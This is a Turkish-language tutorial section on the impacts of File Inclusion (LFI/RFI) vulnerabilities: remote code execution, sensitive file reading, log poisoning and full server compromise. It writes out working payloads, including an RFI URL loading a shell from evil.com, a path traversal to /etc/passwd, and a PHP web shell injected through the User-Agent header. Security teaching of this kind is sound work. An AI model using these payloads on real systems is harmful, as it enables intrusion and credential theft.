## 📂 File Inclusion 7 - Olası Saldırılar ve Etkileri  

File Inclusion (LFI/RFI) zafiyetleri istismar edildiğinde saldırganlara çok ciddi imkanlar sunar. Bu bölümde bu zafiyetlerin olası saldırı senaryoları ve etkileri ele alınmaktadır.  

---

### 1. Remote Code Execution (RCE)  
**Açıklama:**  
- LFI ile log poisoning veya wrapper teknikleri kullanılarak sunucuda zararlı PHP kodu çalıştırılabilir.  
- RFI ile saldırgan uzaktaki bir PHP dosyasını içeri dahil ederek direkt RCE elde edebilir.  

**Kod Örneği:**  
http://target.com/index.php?page=http://evil.com/shell.txt  

**Kullanım:**  
- Saldırgan shell yükler veya zararlı komutlar çalıştırır.  

**Sonuç:**  
- Sistemin tam kontrolü ele geçirilebilir.  

---

### 2. Sensitive Data Sızdırma  
**Açıklama:**  
- LFI kullanılarak sistemin kritik dosyaları okunabilir.  
- Örnek: `/etc/passwd`, `/etc/shadow`, `config.php`, `database.php`.  

**Kod Örneği:**  
http://target.com/index.php?page=../../../../etc/passwd  

**Kullanım:**  
- Konfigürasyon dosyalarındaki DB kullanıcı adı/şifre bilgileri çalınabilir.  
- SSH anahtarları, API anahtarları gibi hassas bilgiler ele geçirilebilir.  

**Sonuç:**  
- Yetkisiz erişim ve veri ihlali gerçekleşir.  

---

### 3. Log File Exploitation  
**Açıklama:**  
- Web sunucusu log dosyalarına zararlı kod enjekte edilip LFI ile bu log dosyaları include edilerek çalıştırılabilir.  
- “Log poisoning” tekniği olarak bilinir.  

**Kod Örneği:**  
User-Agent alanına:  
<?php system($_GET['cmd']); ?>  
Sonrasında çağrı:  
http://target.com/index.php?page=../../../../var/log/apache2/access.log&cmd=id  

**Kullanım:**  
- Saldırgan, zararlı payload’ı log dosyaları üzerinden çalıştırır.  

**Sonuç:**  
- Sunucu üzerinde komut yürütme sağlanır.  

---

### 4. Server Compromise Senaryoları  
**Açıklama:**  
- LFI/RFI istismarı ile başlayan saldırılar, privilege escalation ve lateral movement ile tam sunucu ele geçirme noktasına ilerleyebilir.  

**Senaryo:**  
1. LFI ile config dosyaları okunur.  
2. DB şifreleri ele geçirilir.  
3. Uygulama üzerinden RCE alınır.  
4. Root yetkisi kazanılarak sunucu tamamen ele geçirilir.  

**Sonuç:**  
- Sunucu ve içindeki tüm sistemler saldırgan kontrolüne geçebilir.  

---

📌 **Özet:**  
- **RCE** → Sunucuda kod çalıştırma, en kritik etki.  
- **Sensitive data sızdırma** → DB şifreleri, API key, sistem yapılandırmaları çalınabilir.  
- **Log file exploitation** → Zararlı kod log dosyaları üzerinden çalıştırılır.  
- **Server compromise** → Sunucunun tamamen ele geçirilmesine giden yol açılır.  
